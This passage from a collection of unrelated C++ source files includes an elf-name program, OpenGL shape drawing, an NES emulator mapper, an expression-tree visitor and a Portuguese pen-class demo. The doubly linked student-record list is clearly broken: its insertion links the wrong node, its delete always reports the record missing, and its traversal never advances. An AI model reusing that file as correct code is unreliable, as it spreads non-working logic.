branches[i][j].name;\n                if (i == 0 && j==0)\n                {\n                    branches[i][j].name = \"elf\";\n                }\n                else if (i == 0)\n                {\n                    branches[i][j].name = \"None\";\n                }\n                else\n                {\n                    branches[i][j].name = 'a' + i + j;\n                }\n                \n                \n            }\n        }        \n    }\n\n    void printName()\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                std::cout << \"Elf's name: \" << branches[i][j].name << std::endl;\n            }\n        }\n    }\n\n    void searchName(std::string & elvenName)\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                if (elvenName == branches[i][j].name) \n                {                    \n                    for (int k = 0; k < branches[i]->getMiddleBranch(); ++k)\n                    {\n                        if (branches[i][k].name != \"None\")\n                        {\n                            std::cout << \"Elf's name: \" << branches[i][k].name << std::endl;\n                        }\n                    }\n                    break;\n                }                \n            }\n        }\n    }\n};\n\nint main()\n{\n    srand(time(NULL));\n    int trees = 2;\n    std::string elvenName;\n    \n    ElvenVillage* elvenVillage = new ElvenVillage[trees];\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].setName();\n    }\n\n    std::cout << std::endl;\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].printName();\n    }\n    std::cout << \"Enter the name of the elf you want to find: \";\n    std::cin >> elvenName;\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].searchName(elvenName);\n    }\n\n    delete[] elvenVillage;\n    return 0;\n}",
    "\ufeff/*-----------------------------------------------------------------------------------------\n**\n** Copyright: Juliana, 2024~\n**\n** Filename: main.cpp\n**\n** Description: This File defines the entry of the application\n** \n** Including Function:\n**\t\tmain\n**\n** Design Annotation:\n**\n** Author:\n**\t\tJuliana, start writing this file in May 2024\n**\n** Modification History:\n**\t\tMay 2nd 2024, create this file\n**\t\t$Revision$\n**\t\t$Date$\n**\t\t$Author$\n**\t\t$Log$\n**\n**-----------------------------------------------------------------------------------------\n*/\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\t\t  Include\n**-----------------------------------------------------------------------------------------\n*/\n#include \"twoSum.h\"\n\nusing namespace TwoSum;\n\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\tFunction Definition\n**-----------------------------------------------------------------------------------------\n*/\n/*.BH--------------------------------------------------------------------------------------\n**\n** Function Name: main\n** \n** Description: This function defines the entry of the application\n** \n** Input Parameter:\n**\n** Output Parameter:\n**\n** Return Value:\n**\n** Design Annotation:\n** \n** Modification History:\n**\t\tMay 2nd 2024, create this function\n** \n**.EH--------------------------------------------------------------------------------------\n*/\nint main(void)\n{\n\tTwoSum::Solution::test();\n\n\treturn 0;\n}\n/* END of main */\n",
    "#include \"openGLPart.h\"\nvoid cone(int lats, int longs, double r1, double r2, double L, ColorPattern color)\n//L is the length of cone, r1 and r2 are the radii of head and tail \n{\n    int i, j, k;\n    if (longs == 0)\n        longs = 1;\n    double twopi = 2 * (double)M_PI, phi0, phi1, radius;\n    for (i = 0; i < lats; i++) {\n        phi0 = ((i + 1) % lats + 0.5) * twopi / lats;\n        phi1 = (i % lats + 0.5) * twopi / lats;\n        glBegin(GL_QUAD_STRIP);\n        glVertex3f(0, 0,0);\n        glVertex3f(0, 0.0001,0.0001);\n        for (j = 0; j <= longs; j++) {\n            radius = r1 + (r2 - r1) * j / longs;\n            switch (color) {\n            case CHECKERED:\n                glColor3fv(randomColors + 3 * (i * longs + j % longs));\n                break;\n            case V_STRIPPED:\n                glColor3fv(randomColors + 3 * i);\n                break;\n            case H_STRIPPED:\n                glColor3fv(randomColors + 3 * j % longs);\n                break;\n            case SOLID:\n                glColor4f(0, .7, 0, .8);\n                break;\n            case SOLID_RED:\n                glColor4f(1.0, 0.2, 0.2, .8);\n            }\n            glVertex3f(j * L / longs, radius * cos(phi0), radius * sin(phi0));\n            glVertex3f(j * L / longs, radius * cos(phi1), radius * sin(phi1));\n        }\n        glVertex3f(L, 0, 0);\n        glVertex3f(L, 0.0001, 0.0001);\n        glEnd();\n    }\n}\nvoid eyeBall(double rx, double ry, double rz, int lats, int longs, ColorPattern color, ColorPattern frontColor, bool orientation, bool blink) {\n    int i, j;\n    for (i = 0; i <= lats; i++) {\n        double phi0 = M_PI * (-0.5 + (double)(i - 1) / lats);\n        double phi1 = M_PI * (-0.5 + (double)i / lats);\n        glBegin(GL_QUAD_STRIP);\n        for (j = 0; j <= longs; j++) {\n            double theta = 2 * M_PI * (double)(j - 1) / longs;\n            double x = cos(theta);\n            double y = sin(theta);\n            if (blink || phi0 < 0 && orientation || phi0 >= 0 && !orientation)\n                switch (color) {\n                case CHECKERED:\n                    glColor3fv(randomColors + 3 * (i * longs + j % longs));\n                    break;\n                case V_STRIPPED:\n                    glColor3fv(randomColors + 3 * i);\n                    break;\n                case H_STRIPPED:\n                    glColor3fv(randomColors + 3 * j % longs);\n                    break;\n                case SOLID:\n                    glColor4f(0, .7, 0, .8);\n                    break;\n                }\n            else\n                if (frontColor == SOLID_BLACK)\n                    glColor4f(0, 0, 0, .8);\n                else\n                    glColor4f(1, 1, 1, .8);\n            glVertex3f(rx * x * cos(phi0), ry * y * cos(phi0), rz * sin(phi0));\n            glVertex3f(rx * x * cos(phi1), ry * y * cos(phi1), rz * sin(phi1));\n        }\n        glEnd();\n    }\n}\nvoid head(double rx, double r, int lats, int longs, ColorPattern color, bool blink) {\n    int i, j;\n    for (i = 0; i <= lats; i++) {\n        double phi0 = M_PI * (-0.5 + (double)(i - 1) / lats);\n        double phi1 = M_PI * (-0.5 + (double)i / lats);\n        glBegin(GL_QUAD_STRIP);\n        for (j = 0; j <= longs; j++) {\n            double theta = M_PI * (-0.5 + (double)(j) / longs);\n            double x = cos(theta);\n            double y = sin(theta);\n            switch (color) {\n            case CHECKERED:\n                glColor3fv(randomColors + 3 * (i * longs + j % longs));\n                break;\n            case V_STRIPPED:\n                glColor3fv(randomColors + 3 * i);\n                break;\n            case H_STRIPPED:\n                glColor3fv(randomColors + 3 * j % longs);\n                break;\n            case SOLID:\n                glColor4f(0, .7, 0, .8);\n                break;\n            }\n            glVertex3f(rx * x * cos(phi0), r * y * cos(phi0), r * sin(phi0));\n            glVertex3f(rx * x * cos(phi1), r * y * cos(phi1), r * sin(phi1));\n        }\n        glEnd();\n    }\n    if (!blink) {\n        glPushMatrix();\n        glTranslatef(rx / 2, r / 3, r / -1.3);\n        eyeBall(r / 2, r / 4, r / 5, lats, longs, color, SOLID_WHITE, false, blink);\n        glPushMatrix();\n        glTranslatef(r / 10, 0, 0);\n        eyeBall(r / 4, r / 5, r / 5, lats, longs, color, SOLID_BLACK, false, blink);\n        glPopMatrix();\n        glPopMatrix();\n        glPushMatrix();\n        glTranslatef(rx / 2, -r / 3, r / -1.3);\n        eyeBall(r / 2, r / 4, r / 5, lats, longs, color, SOLID_WHITE, false, blink);\n        glPushMatrix();\n        glTranslatef(r / 10, 0, 0);\n        eyeBall(r / 4, r / 5, r / 5, lats, longs, color, SOLID_BLACK, false, blink);\n        glPopMatrix();\n        glPopMatrix();\n    }\n    else {\n        glPushMatrix();\n        glTranslatef(rx / 2, r / 3, r / -1.3);\n        eyeBall(r / 2, r / 4, r / 5, lats, longs, color, color, false, blink);\n        glPopMatrix();\n        glPushMatrix();\n        glTranslatef(rx / 2, -r / 3, r / -1.3);\n        eyeBall(r",
    "#include\t\"..\\..\\DLL\\d_iNES.h\"\n#include\t\"..\\..\\Hardware\\h_Latch.h\"\n\nnamespace {\nvoid\tsync (void) {\n\tEMU->SetPRG_RAM8(0x6, 0);\n\tint prg =Latch::data &0x3F;\n\tswitch (Latch::addr &3) {\n\t\tcase 0:\tEMU->SetPRG_ROM32(0x8, prg >>1);\n\t\t\tbreak;\n\t\tcase 1:\tEMU->SetPRG_ROM16(0x8, prg   );\n\t\t\tEMU->SetPRG_ROM16(0xC, prg |7);\n\t\t\tbreak;\n\t\tcase 2:\tEMU->SetPRG_ROM8(0x8, prg <<1 | Latch::data >>7);\n\t\t\tEMU->SetPRG_ROM8(0xA, prg <<1 | Latch::data >>7);\n\t\t\tEMU->SetPRG_ROM8(0xC, prg <<1 | Latch::data >>7);\n\t\t\tEMU->SetPRG_ROM8(0xE, prg <<1 | Latch::data >>7);\n\t\t\tbreak;\n\t\tcase 3:\tEMU->SetPRG_ROM16(0x8, prg);\n\t\t\tEMU->SetPRG_ROM16(0xC, prg);\n\t\t\tbreak;\n\t}\n\tEMU->SetCHR_RAM8(0, 0);\n\t\n\tif (Latch::data &0x40)\n\t\tEMU->Mirror_H();\n\telse\t\n\t\tEMU->Mirror_V();\n}\n\nBOOL\tMAPINT\tload (void) {\n\tiNES_SetSRAM();\n\tLatch::load(sync, false);\n\treturn TRUE;\n}\n\nvoid\tMAPINT\treset (RESET_TYPE resetType) {\n\tif (resetType ==RESET_HARD && ROM->INES_Flags &4) {\n\t\t// A few ROM hacks use 512-byte trainers; copy them into PRG-RAM.\n\t\tfor (unsigned int i =0; i <ROM->MiscROMSize; i++) ROM->PRGRAMData[(0x1000 +i) &(ROM->PRGRAMSize -1)] =ROM->MiscROMData[i];\n\t}\n\tLatch::reset(RESET_HARD);\n}\n\nuint16_t MapperNum =15;\n} // namespace\n\nMapperInfo MapperInfo_015 ={\n\t&MapperNum,\n\t_T(\"K-1029\"),\n\tCOMPAT_FULL,\n\tload,\n\treset,\n\tNULL,\n\tNULL,\n\tNULL,\n\tLatch::saveLoad_AD,\n\tNULL,\n\tNULL\n};",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode(){\n    Node* newNode = new Node(); // step 1 : create a new node\n    cout << \"\\nEnter the roll number of the student : \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student : \";\n    cin >> newNode->name;      // assign value to the data field of the new node\n\n    // Insert the nw node in the list\n    if (START != NULL && newNode->noMhs == START->noMhs) {\n\n        if (START != NULL && newNode->noMhs == START->noMhs){\n            cout << \"\\033[31mDuplicate roll not allowed\\033]0m\" << endl;\n            return;\n        }\n        // if the list empty, make the new node the START\n        newNode->next = START; // step 3 : make the new node point to the first node\n        if (START != NULL) {\n            START->prev = newNode; // step 4 : make the first node point to the new node\n        }\n        newNode->prev = NULL; // step 5 : make the new node point to NULL\n        START = newNode; // step 6 : make the new node the first node\n    }\n    else{\n        // insert the new node in the middle or at the end\n        Node *current = START; // step 1.a : start from the first node\n        Node *previous = NULL; // step 1.b : previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) // step 1.c traverse the list to find the correct position\n        {\n            previous = current; // step 1.d : move the previous to the current node\n            current = current->next; // step 1.e : move the currrent to the next node\n        }\n\n        newNode->next = previous; // step 4 : make the next field of the new node point to current\n        newNode->prev = previous; // step 5 : make the previous field of the new node point to previous\n\n        if (current != NULL)\n        {\n            current->prev = newNode; // step 6 : make the next previous field of the current node point ti the new world\n        }\n\n        if (previous != NULL)\n        {\n            previous->next =newNode; // step 7 : make the next field of the previous node point to the new node\n        }\n        else\n        {\n            // if previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n    \n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = * current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout <<\"\\nEnter the roll number of the student whose record is to be deleted : \";\n    cin >> rollNo; // step 3 : get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START; // step 1 : start from the first node\n    previous = NULL;\n\n    // Locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        cout << \"\\033[31mThe record wtih toll number \" << rollNo << \" not found\\033[0m\" << endl;\n        return;\n    }\n\n    // Node to be deleted is the first node\n    if (current == START)\n    {\n        START = START->next; // step 2 : update the START pointer\n        if (START != NULL)\n        {\n           START->prev = NULL; \n        }\n    }\n    else\n    { // Node to be deletd is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        { // if there's a succesor, update is prev pointer\n            current->next->prev = previous;\n        } \n    }\n\n    // release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are : \" << endl;\n        Node *currentNode = START; // step 1\n        while (currentNode != NULL) // step 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl; // step 3\n        }\n    }\n}\n\nvoid revtravese()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are : \" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n            currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n        \n    }\n    \n}\nvoid searchData(){\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node ",
    "\ufeff#include <iostream>\n#include <cassert>\n#include <string> \nusing namespace std;\n\nstruct Transformer;\nstruct Number;\nstruct BinaryOperation;\nstruct FunctionCall;\nstruct Variable;\n\nstruct Expression //\u0431\u0430\u0437\u043e\u0432\u0430\u044f \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430\n{\n\tvirtual ~Expression() { } //\u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tvirtual double evaluate() const = 0; //\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\tvirtual Expression* transform(Transformer* tr) const = 0;\n\tvirtual std::string print() const = 0;//\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u043f\u0435\u0447\u0430\u0442\u044c\n};\n\nstruct Transformer //pattern Visitor\n{\n\tvirtual ~Transformer() {}\n\tvirtual Expression* transformNumber(Number const*) = 0;\n\tvirtual Expression* transformBinaryOperation(BinaryOperation const*) = 0;\n\tvirtual Expression* transformFunctionCall(FunctionCall const*) = 0;\n\tvirtual Expression* transformVariable(Variable const*) = 0;\n};\n\nstruct Number : Expression // \u0441\u0442\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0427\u0438\u0441\u043b\u043e\u00bb\n{\n\tNumber(double value) : value_(value) {} //\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tdouble value() const { return value_; } // \u043c\u0435\u0442\u043e\u0434 \u0447\u0442\u0435\u043d\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0447\u0438\u0441\u043b\u0430\n\tdouble evaluate() const { return value_; } // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t~Number() {}//\u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440, \u0442\u043e\u0436\u0435 \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439\n\tstd::string print() const { return std::to_string(this->value_); }\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformNumber(this);\n\t}\nprivate:\n\tdouble value_; // \u0441\u0430\u043c\u043e \u0432\u0435\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n};\n\n\nstruct BinaryOperation : Expression // \u00ab\u0411\u0438\u043d\u0430\u0440\u043d\u0430\u044f \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f\u00bb\n{\n\tenum { // \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0438\u043c \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u0437\u0430\u0448\u0438\u0444\u0440\u0443\u0435\u043c \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0439\n\t\tPLUS = '+',\n\t\tMINUS = '-',\n\t\tDIV = '/',\n\t\tMUL = '*'\n\t};\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u044c 2 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430 \u2014 \u043b\u0435\u0432\u044b\u0439 \u0438 \u043f\u0440\u0430\u0432\u044b\u0439, \u0430 \u0442\u0430\u043a\u0436\u0435 \u0441\u0430\u043c \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tBinaryOperation(Expression const* left, int op, Expression const* right) : left_(left), op_(op), right_(right)\n\t{\n\t\tassert(left_ && right_);\n\t}\n\t~BinaryOperation() //\u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043e\u0441\u0432\u043e\u0431\u043e\u0434\u0438\u043c \u0437\u0430\u043d\u044f\u0442\u0443\u044e \u043f\u0430\u043c\u044f\u0442\u044c\n\t{\n\t\tdelete left_;\n\t\tdelete right_;\n\t}\n\tExpression const* left() const { return left_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043b\u0435\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tExpression const* right() const { return right_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043f\u0440\u0430\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tint operation() const { return op_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\tdouble left = left_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043b\u0435\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tdouble right = right_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tswitch (op_) // \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 \u0432\u0438\u0434\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438, \u0441\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0435\u043c, \u0432\u044b\u0447\u0438\u0442\u0430\u0435\u043c, \u0443\u043c\u043d\u043e\u0436\u0430\u0435\u043c\n\t\t\t// \u0438\u043b\u0438 \u0434\u0435\u043b\u0438\u043c \u043b\u0435\u0432\u0443\u044e \u0438 \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u0438\n\t\t{\n\t\tcase PLUS: return left + right;\n\t\tcase MINUS: return left - right;\n\t\tcase DIV: return left / right;\n\t\tcase MUL: return left * right;\n\t\t}\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformBinaryOperation(this);\n\t}\n\tstd::string print() const {\n\t\treturn this->left_->print() + std::string(1, this->op_) + this->right_->print();\n\t}\nprivate:\n\tExpression const* left_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043b\u0435\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tExpression const* right_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043f\u0440\u0430\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tint op_; // \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n};\nstruct FunctionCall : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0412\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\u00bb\n{\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u0447\u0435\u0441\u0442\u044c \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0438 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n\tFunctionCall(std::string const& name, Expression const* arg) : name_(name),\n\t\targ_(arg)\n\t{\n\t\tassert(arg_);\n\t\tassert(name_ == \"sqrt\" || name_ == \"abs\");\n\t} // \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u044b \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u044b\u0437\u043e\u0432 sqrt \u0438 abs\n\tstd::string const& name() const\n\t{\n\t\treturn name_;\n\t}\n\tExpression const* arg() const // \u0447\u0442\u0435\u043d\u0438\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\t{\n\t\treturn arg_;\n\t}\n\t~FunctionCall() { delete arg_; } // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435\n\tvirtual double evaluate() const { // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430\n\t\t//\u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t\tif (name_ == \"sqrt\")\n\t\t\treturn sqrt(arg_->evaluate()); // \u043b\u0438\u0431\u043e \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u0440\u0435\u043d\u044c \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439\n\t\telse return fabs(arg_->evaluate());\n\t} // \u043b\u0438\u0431\u043e \u043c\u043e\u0434\u0443\u043b\u044c \u2014 \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n//\u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u044b\n\tstd::string print() const {\n\t\treturn this->name_ + \"(\" + this->arg_->print() + \")\";\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformFunctionCall(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\tExpression const* arg_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n};\nstruct Variable : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f\u00bb\n{\n\tVariable(std::string const& name) : name_(name) { } //\u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e\n\t//\u0443\u043a\u0430\u0437\u0430\u0442\u044c \u0435\u0435 \u0438\u043c\u044f\n\tstd::string const& name() const { return name_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0438\u043c\u0435\u043d\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\treturn 0.0;\n\t}\n\tstd::string print() const {\n\t\treturn this->name_;\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformVariable(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n};\n\n//\u0420\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d \u043a\u043b\u0430\u0441\u0441 CopySyntaxTree\nstruct CopySyntaxTree : Transformer\n{\n\tExpression* transformNumber(Number const* number)\n\t{\n\t\tExpression* exp = new Number(number->value());\n\t\treturn exp;\n\t}\n\tExpression* transformBinaryOperation(BinaryOperation const* binop)\n\t{\n\t\tExpression* exp = new BinaryOperation((binop->left())->transform(this), binop->operation(), (binop->right())->transform(this));\n\t\treturn exp;\n\t}\n\tExpression* transformFunctionCall(FunctionCall const* fcall)\n\t{\n\t\tExpression* exp = new ",
    "#include <iostream>\n#include <cctype>\nusing namespace std;\n\nclass Pen\n{\npublic:\n    string model;\n    string color;\n    float tip;\n    int charge;\n    bool covered;\n\n    void scribble()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta esta tampada!\" << endl;\n        }\n        else\n        {\n            charge -= 1;\n            cout << \"A caneta rabiscou e agora a caneta tem \"<< charge <<\" % da carga!\" << endl;\n        }\n    }\n\n    void cover()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta ja esta tampada!\" << endl;\n        }\n        else\n        {\n            cout << \"A caneta foi tampada!\" << endl;\n            covered = true;\n        }\n    }\n\n    void uncover()\n    {\n        if (covered == true)\n        {\n            cout << \"A caneta foi destampada!\" << endl;\n            covered = false;\n        }\n        else\n        {\n            cout << \"[ERROR] A caneta nao esta tampada!\" << endl;\n        }\n    }\n};\n\nstring toLowerCase(const string &str)\n{\n    string lowerStr = str;\n    for (int i = 0; i < lowerStr.length(); ++i)\n    {\n        if (lowerStr[i] >= 'A' && lowerStr[i] <= 'Z')\n        {\n            lowerStr[i] += ('a' - 'A');\n        }\n    }\n    return lowerStr;\n}\n\nint main()\n{\n    Pen pen1;\n    cout << \"Qual e o modelo da caneta: \";\n    getline(cin, pen1.model);\n    cout << \"Qual e a cor da caneta: \";\n    getline(cin, pen1.color);\n    cout << \"Qual e o tamanho da ponta: \";\n    cin >> pen1.tip;\n    cout << \"Qual e a percentagem da carga: \";\n    cin >> pen1.charge;\n    if (pen1.charge < 0 || pen1.charge > 100)\n    {\n        cout << \"[ERROR] valor incorreto. Verifique sua resposta e tente de novo.\";\n        return 0;\n    }\n    \n    string response;\n    cout << \"A caneta esta tampada (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        pen1.covered = true;\n        response = \"esta\";\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        pen1.covered = false;\n        response = \"nao esta\";\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n        return 0;\n    }\n    \n    cout << \"A sua caneta e do modelo \" << pen1.model << \", a cor da sua caneta e \" << pen1.color << \", o tamanho da ponta e \" << pen1.tip << \", a carga da caneta esta a \" << pen1.charge << \"% e a caneta \" << response << \" tampada.\" << endl;\n\n    cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        while (toLowerCase(response) == \"y\")\n        {\n            cout << \"O que deseja fazer(rabiscar, tampar ou destampar):\";\n            cin >> response;\n            if (toLowerCase(response) == \"rabiscar\")\n            {\n                pen1.scribble();\n            }\n            else if (toLowerCase(response) == \"tampar\")\n            {\n                pen1.cover();\n            }\n            else if (toLowerCase(response) == \"destampar\")\n            {\n                pen1.uncover();\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n                return 0;\n            }\n\n            cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n            cin >> response;\n\n            if (toLowerCase(response) == \"y\")\n            {\n                \n            }\n            else if (toLowerCase(response) == \"n\")\n            {\n                return 0;\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. 